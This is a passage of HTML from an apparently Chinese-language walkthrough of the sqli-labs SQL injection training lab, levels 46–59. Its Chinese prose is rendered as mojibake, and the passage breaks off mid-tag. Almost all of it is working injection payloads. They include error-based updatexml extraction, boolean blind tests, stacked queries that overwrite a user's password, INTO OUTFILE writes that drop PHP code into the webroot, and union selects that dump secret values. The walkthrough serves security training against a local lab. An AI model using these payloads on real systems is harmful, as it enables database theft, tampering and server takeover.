<span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">å›æ˜¾</span><br><span class="line">æˆåŠŸå†™å…¥</span><br></pre></td></tr></table></figure><p>phpinfoå†™å…¥ï¼Œåˆ©ç”¨<code> lines terminated by hex(payload)</code>,å³ç”¨payloadåˆ†éš”æ¯ä¸€è¡Œç»“æœã€‚ä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">åæ˜¾</span><br><span class="line">åœ¨test.phpé‡Œ</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span>â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br>MYSQL æ³¨å…¥å¤©ä¹¦</p><h3 id="level-47"><a href="#level-47" class="headerlink" title="level-47"></a>level-47</h3><p><strong>ORDER BY-æœ‰æŠ¥é”™å›æ˜¾-å•å¼•å·-æ³¨å…¥</strong><br>åŸç†åŒlevel-46ï¼Œä¸è¿‡åŠ äº†å•å¼•å·<br>1ã€æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-47/?sort=1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY &#x27;1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27;</span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2ã€æ–‡ä»¶å†™å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">47</span>/?sort=<span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020  %23</span></span><br><span class="line"><span class="string">åç«¯</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020 #&#x27;</span></span><br><span class="line">å›æ˜¾ï¼Œtest.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹éƒ½ä¸€æ ·ï¼Œæ³¨æ„å‰åé—­åˆå³å¯ï¼Œä¸è¯¦ç»†å±•ç¤ºäº†ï¼Œ</p><h3 id="level-48"><a href="#level-48" class="headerlink" title="level-48"></a>level-48</h3><p><strong>ORDER BY-æ— æŠ¥é”™å›æ˜¾-ç›²æ³¨-æ³¨å…¥</strong><br>1ã€å¸ƒå°”æ³¨å…¥ï¼Œæ—¶é—´ç›²æ³¨ä¸å±•å¼€ï¼Œç±»ä¼¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">ç­‰åŒäºorder by <span class="number">1</span>,å³sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>2ã€æ–‡ä»¶å†™å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span> </span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span></span><br><span class="line">å›æ˜¾ test.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-49"><a href="#level-49" class="headerlink" title="level-49"></a>level-49</h3><p><strong>ORDER BY-æ— æŠ¥é”™å›æ˜¾-å•å¼•å·-ç›²æ³¨-æ³¨å…¥</strong><br>åŸç†ç±»ä¼¼level-48ï¼Œé—­åˆå•å¼•å·å³å¯ï¼Œä»…ç»™å‡ºå¸ƒå°”æ³¨å…¥ï¼Œä¸å±•å¼€äº†<br>1ã€å¸ƒå°”æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">49</span>/?sort=<span class="number">0</span><span class="string">&#x27; or length(database())=8 or &#x27;</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> length(database())=<span class="number">8</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">ç­‰åŒäºorder by <span class="number">1</span>ï¼Œå³sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-50"><a href="#level-50" class="headerlink" title="level-50"></a>level-50</h3><p><strong>ORDER BY-æœ‰æŠ¥é”™å›æ˜¾-å †å æ³¨å…¥-æ³¨å…¥</strong><br>1ã€æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY 1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2ã€å †å æ³¨å…¥ï¼Œå› ä¸ºæŸ¥è¯¢å‡½æ•°ä¸ºmysqli_multi_query</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">50</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">å›æ˜¾ï¼ŒæˆåŠŸä¿®æ”¹</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">333</span></span><br></pre></td></tr></table></figure><p>3ã€æ–‡ä»¶å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY 1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">å›æ˜¾ï¼Œtest.php</span><br><span class="line">123&lt;?php phpinfo();?&gt;  </span><br></pre></td></tr></table></figure><h3 id="level-51"><a href="#level-51" class="headerlink" title="level-51"></a>level-51</h3><p><strong>ORDER BY-æœ‰æŠ¥é”™å›æ˜¾-å•å¼•å·-å †å æ³¨å…¥-æ³¨å…¥</strong><br>åŸç†åŒlevel-50ï¼Œåªä¸è¿‡åŠ äº†å•å¼•å·ï¼Œæ³¨æ„é—­åˆå³å¯ï¼Œä»…å±•ç¤ºæŠ¥é”™æ³¨å…¥ï¼Œå…¶ä»–ä¸å±•å¼€äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">51</span>/?sort=<span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-52"><a href="#level-52" class="headerlink" title="level-52"></a>level-52</h3><p><strong>ORDER BY-æ— æŠ¥é”™å›æ˜¾-å †å æ³¨å…¥-æ³¨å…¥</strong><br>åŸç†ç±»ä¼¼level-50ï¼Œæ— æŠ¥é”™å›æ˜¾,ä»…å±•ç¤ºå †å æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">52</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">åç«¯</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">å›æ˜¾ï¼Œä¿®æ”¹æˆåŠŸ</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">343</span></span><br></pre></td></tr></table></figure><h3 id="level-53"><a href="#level-53" class="headerlink" title="level-53"></a>level-53</h3><p><strong>ORDER BY-æ— æŠ¥é”™å›æ˜¾-å•å¼•å·-å †å æ³¨å…¥-æ³¨å…¥</strong><br>åŸç†åŒlevel-52ï¼Œæ³¨æ„å•å¼•å·é—­åˆå³å¯ï¼Œä»…å±•ç¤ºå †å æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">53</span>/?sort=<span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;</span></span><br><span class="line"><span class="string">åç«¯</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;&#x27;</span></span><br><span class="line">å›æ˜¾ï¼Œä¿®æ”¹æˆåŠŸ </span><br><span class="line"><span class="number">1</span>Dumb<span class="number">443</span></span><br></pre></td></tr></table></figure><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>challengesæ˜¯è´´è¿‘å®æˆ˜çš„æµ‹è¯•ï¼Œä¸»è¦é™åˆ¶äº†è¯•é”™æ¬¡æ•°ã€‚</p><h3 id="level-54"><a href="#level-54" class="headerlink" title="level-54"></a>level-54</h3><p>ç”¨å•å¼•å·åŠ æ³¨é‡Šæµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">è¿”å›æ­£ç¡®ï¼Œè¯´æ˜åå°åªæ˜¯åŠ äº†å•å¼•å·</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ç»§ç»­çˆ†å­—æ®µï¼Œç›´æ¥çŒœæµ‹ä¸º3ä¸ªï¼Œä¸è¡Œå°±4ä¸ªï¼Œä¸ç”¨order byï¼Œæµªè´¹æ¬¡æ•°ï¼Œä»¥åŠè¿™æ ·å¯ä»¥ç›´æ¥å‡ºåˆ©ç”¨ä½ç½®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span></span><br><span class="line"></span><br><span class="line">åˆ©ç”¨ä½ç½®<span class="number">3</span>ï¼Œçˆ†è¡¨</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:u3s457bfxv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å­—æ®µ</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;u3s457bfxv&#x27;</span>%<span class="number">23</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="built_in">id</span>,sessid,secret_I2EY,tryy</span><br><span class="line"></span><br><span class="line">çˆ†å€¼</span><br><span class="line">GAT DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,secret_I2EY from u3s457bfxv%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">DUAj72iD5Abea04ua8qIXd7g</span></span><br><span class="line"><span class="string">æäº¤ä¹‹åæˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="level-55"><a href="#level-55" class="headerlink" title="level-55"></a>level-55</h3><p>ä½¿ç”¨å•å¼•å·åŠ æ³¨é‡Šæµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">55</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23 æ— å›æ˜¾</span></span><br><span class="line"><span class="string">æµ‹è¯•äº†6æ¬¡å¾—åˆ°ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=1) %23</span></span><br><span class="line"><span class="string">ç›´æ¥çŒœå­—æ®µä¸º3</span></span><br><span class="line"><span class="string">GET DATA </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:g1e3zfujs5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å­—æ®µ</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>g1e3zfujs5<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:id,sessid,secret_FXZC,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å€¼</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,secret_FXZC from g1e3zfujs5%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:t92gntGas0AeUxo7Sjpg8mGZ</span></span><br><span class="line"><span class="string">æäº¤æˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="level-56"><a href="#level-56" class="headerlink" title="level-56"></a>level-56</h3><p>å•å¼•å·+æ³¨é‡Šæµ‹è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23 å¤±è´¥</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=1&#x27;</span>) <span class="keyword">or</span> <span class="number">1</span> %<span class="number">23</span> æˆåŠŸ</span><br><span class="line">è¿™é‡Œå‘ç°ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨ <span class="keyword">or</span> <span class="number">1</span>ï¼Œå•çº¯æ³¨é‡Šç¬¦æœ‰æ—¶å€™è«åé€šè¿‡</span><br><span class="line"></span><br><span class="line">è¿˜æ˜¯çŒœæµ‹å­—æ®µä¸º<span class="number">3</span></span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Password:tnkca4stlm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å­—æ®µ</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=-1&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;tnkca4stlm&#x27;</span>%<span class="number">23</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>tnkca4stlm<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å€¼</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=-1&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,secret_QUFJ <span class="keyword">from</span> tnkca4stlm%<span class="number">23</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Password:mMva7E0J8QnTlW0PUdryGK3T</span><br><span class="line">æäº¤æˆåŠŸ</span><br></pre></td></tr></table></figure><h3 id="level-57"><a href="#level-57" class="headerlink" title="level-57"></a>level-57</h3><p>è¿˜æ˜¯ å•å¼•å·+æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">57</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1 %23 å¤±è´¥</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; or 1 %23 æˆåŠŸ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çŒœæµ‹å­—æ®µæ•°ä¸º3</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:dyf6pnyj47</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å­—æ®µ</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>dyf6pnyj47<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Password:id,sessid,secret_XYQT,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å€¼</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,secret_XYQT  from dyf6pnyj47%23</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">Your Password:6E1816JZRP4jhcOqchtdZ7dJ</span></span><br><span class="line"><span class="string">æäº¤æˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="level-58"><a href="#level-58" class="headerlink" title="level-58"></a>level-58</h3><p>å•å¼•å·+æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; or 1 %23 æˆåŠŸ</span></span><br><span class="line"><span class="string">çŒœæµ‹å­—æ®µæ•°ä¸º3</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-58/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">Your Password : dhakkan</span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µ</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-59"><a href="#level-59" class="headerlink" title="level-59"></a>level-59</h3><p>ä¼ ç»ŸæŠ€èƒ½ï¼Œå•å¼•å·+æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1%23   æˆåŠŸ</span></span><br><span class="line"><span class="string">çˆ†è¡¨</span></span><br><span class="line"><span 